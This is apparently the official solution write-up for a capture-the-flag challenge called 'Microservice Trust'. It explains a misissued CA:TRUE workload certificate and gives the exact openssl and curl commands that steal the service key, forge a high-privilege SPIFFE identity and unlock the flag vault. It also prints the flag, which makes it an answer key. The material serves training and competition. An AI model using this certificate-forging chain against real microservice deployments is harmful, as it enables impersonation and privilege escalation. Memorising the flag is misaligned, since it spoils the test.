# X02 — Microservice Trust: Official Solution & Technical Breakdown

## Challenge Overview
- **Challenge ID:** X02
- **Name:** Microservice Trust
- **Category:** Service Identity / Authorization / Microservices
- **Difficulty:** Expert / Bonus
- **External Interface:** TCP/80 (HTTP Web / REST API)
- **Flag Format:** `YUVA{m1cr0s3rv1c3_1d3nt1ty_ch41n_br0k3n_x02}`

---

## Architecture & Topology

The challenge implements a 4-tier microservice architecture within the Latverian Sovereign Citadel:

```
Player / Participant
       │
     TCP/80
       │
       ▼
┌────────────────────────────────────────┐
│  Public Gateway Ingress (Port 80)       │
└──────────────────┬─────────────────────┘
                   │
                   ▼ (Routes public API requests)
┌────────────────────────────────────────┐
│  Service A: Edge Telemetry Agent       │
│  Internal: 127.0.0.1:8081              │
│  Identity: spiffe://.../telemetry-agent│
│  Trust: LOW TRUST                      │
└──────────────────┬─────────────────────┘
                   │
                   ▼ (Citadel mTLS Identity Assertion: X-Citadel-Identity-Cert)
┌────────────────────────────────────────┐
│  Service B: Core Controller            │
│  Internal: 127.0.0.1:8082              │
│  Trust: HIGH PRIVILEGE                 │
│  Enforces Root CA Chain Verification   │
└──────────────────┬─────────────────────┘
                   │
                   ▼ (Admin Grant Ticket: LATV-ADMIN-TICKET-*)
┌────────────────────────────────────────┐
│  Admin Service: Citadel Vault          │
│  Internal: 127.0.0.1:8083              │
│  Trust: SOVEREIGN ROOT (Flag Vault)    │
└────────────────────────────────────────┘
```

---

## Vulnerability Analysis: The Broken Trust Assumption

In modern zero-trust microservice networks, services verify caller identities using client certificates (mTLS) or signed identity tokens (SPIFFE X509-SVIDs).

### 1. The Root Cause (Flawed Sub-CA Issuance)
When the challenge-local Root CA issued the identity certificate for Service A (`telemetry-agent`), it mistakenly configured the certificate with:
```text
X509v3 Basic Constraints:
    CA:TRUE, pathlen:1
X509v3 Key Usage:
    Digital Signature, Key Encipherment, Certificate Sign
```
Normally, end-entity workload certificates must have `CA:FALSE` and lack `keyCertSign`. Because Service A's certificate is recognized as a valid intermediate CA by the Root CA, any certificate signed by Service A chains back to the trusted Citadel Root CA!

### 2. Privilege Separation in Service B
Service B (`core-controller`) protects privileged operations (`POST /api/v1/core/grant-admin-ticket`). When an incoming request arrives with a client certificate chain in `X-Citadel-Identity-Cert`:
1. Service B executes `openssl verify -CAfile ca.crt -untrusted intermediate.crt leaf.crt`.
2. Because Service A is a valid CA in the chain, OpenSSL verifies the signature successfully.
3. Service B extracts the SPIFFE ID / Subject from the leaf certificate.
4. If the identity matches `spiffe://latveria.citadel/sa/doombot-orchestrator`, Service B issues an Admin Grant Ticket.

### 3. Exploit Vector
1. Discover Service A's credentials via the diagnostic export endpoint: `GET /api/v1/diagnostics/export`.
2. Notice `BasicConstraints: CA:TRUE` in Service A's certificate.
3. Generate a local RSA private key.
4. Create a certificate signing request (CSR) with Subject `/CN=doombot-orchestrator.latveria.local` and SAN `URI:spiffe://latveria.citadel/sa/doombot-orchestrator`.
5. Sign the CSR using Service A's private key (`service-a.key`) and certificate (`service-a.crt`).
6. Present the forged leaf certificate + Service A's certificate chain to Service B via `X-Citadel-Identity-Cert`.
7. Service B accepts the certificate chain, validates the high-privilege `doombot-orchestrator` identity, and returns a single-use Admin Ticket (`LATV-ADMIN-TICKET-*`).
8. Present the Admin Ticket to Admin Vault (`POST /api/v1/admin/unlock-vault`) with `Authorization: Bearer <TICKET>`.
9. The Vault unlocks and returns the sovereign challenge flag!

---

## Step-by-Step Exploitation

### Step 1: Enumerate Ingress Gateway
```bash
curl -s http://127.0.0.1:80/api/v1/topology | jq .
```

### Step 2: Export Service A Diagnostics Bundle
```bash
curl -s http://127.0.0.1:80/api/v1/diagnostics/export > diag.json
```
Extract `ca.crt`, `service-a.crt`, and `service-a.key`.

### Step 3: Forge High-Privilege Orchestrator Certificate
```bash
# Generate private key & CSR
openssl req -newkey rsa:2048 -nodes -keyout orch.key -out orch.csr -subj "/CN=doombot-orchestrator.latveria.local"

# Prepare extension file with SPIFFE ID
echo "subjectAltName = URI:spiffe://latveria.citadel/sa/doombot-orchestrator" > orch.ext

# Sign with Service A sub-CA key
openssl x509 -req -in orch.csr -CA service-a.crt -CAkey service-a.key -CAcreateserial -out orch.crt -days 365 -extfile orch.ext

# Build full chain
cat orch.crt service-a.crt > full_chain.pem
```

### Step 4: Request Admin Ticket from Service B
```bash
curl -s -X POST http://127.0.0.1:80/api/v1/core/grant-admin-ticket \
     -H "X-Citadel-Identity-Cert: $(cat full_chain.pem)" \
     -H "Content-Type: application/json" \
     -d '{}'
```
Response:
```json
{
  "action": "ADMIN_TICKET_GRANTED",
  "admin_ticket": "LATV-ADMIN-TICKET-A1B2C3D4E5F67890123456789ABCDEF0",
  "status": "SUCCESS"
}
```

### Step 5: Unlock Vault and Retrieve Flag
```bash
curl -s -X POST http://127.0.0.1:80/api/v1/admin/unlock-vault \
     -H "Authorization: Bearer LATV-ADMIN-TICKET-A1B2C3D4E5F67890123456789ABCDEF0"
```
Response:
```json
{
  "flag": "YUVA{m1cr0s3rv1c3_1d3nt1ty_ch41n_br0k3n_x02}",
  "status": "UNLOCKED"
}
```

---

## Validation & Automated Testing
Run the official solve script:
```bash
python3 organizer/solve.py --host 127.0.0.1 --port 80
```
Run the complete test suite:
```bash
python3 organizer/test_challenge.py --host 127.0.0.1 --port 80
```
